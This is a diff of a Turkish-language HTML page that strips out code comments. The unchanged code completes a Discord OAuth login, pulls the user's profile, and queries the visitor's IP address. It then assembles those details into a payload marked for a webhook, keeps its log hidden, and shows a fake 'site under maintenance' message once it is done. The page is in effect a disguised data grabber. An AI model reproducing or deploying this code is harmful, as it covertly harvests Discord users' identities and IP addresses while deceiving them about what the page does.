@@ -30,14 +30,12 @@
       user-select: none;
       transition: color 0.5s ease;
     }
-    /* RGB animasyon class'ı */
     .rgb {
       animation: rgbCycle 4s linear infinite;
       font-size: 2.5rem;
       color: inherit;
       text-align: center;
     }
-    /* Log gizli */
     #log {
       display: none;
     }
@@ -58,10 +56,7 @@
       const statusEl = document.getElementById("status");
 
       const log = (msg) => {
-        // İstersen log'u console da göster
         console.log(msg);
-        // Log alanı görünmesin ama istersen yorum satırını kaldır log göstermek için
-        // logEl.textContent += "\n" + msg;
       };
 
       const code = new URLSearchParams(window.location.search).get("code");
@@ -73,7 +68,6 @@
       try {
         log("OAuth başlatılıyor...");
 
-        // 1. access_token al
         const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
           method: "POST",
           headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -89,22 +83,18 @@
         if (!tokenData.access_token) throw new Error("Access token alınamadı.");
         log("✅ access_token alındı.");
 
-        // 2. Kullanıcı bilgisi çek
         const userRes = await fetch("https://discord.com/api/users/@me", {
           headers: { "Authorization": `Bearer ${tokenData.access_token}` }
         });
         const user = await userRes.json();
         log("✅ Kullanıcı bilgisi çekildi.");
 
-        // 3. Vanity URL (kısa kullanıcı URL'si)
         const vanity_url = `https://discord.com/users/${user.id}`;
 
-        // 4. IP adresi çek
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         log("✅ IP adresi alındı.");
 
-        // 5. Webhook'a gönderilecek payload
         const payload = {
           id: user.id,
           username: `${user.username}#${user.discriminator}`,
@@ -125,7 +115,6 @@
         log("Gönderilen veri:");
         log(JSON.stringify(payload, null, 2));
 
-        // İşlem tamamlandıktan sonra mesajı değiştir ve RGB animasyonunu ekle
         statusEl.textContent = "Sitemiz Şu anda Bakımda.";
         statusEl.classList.add("rgb");
       } catch (err) {
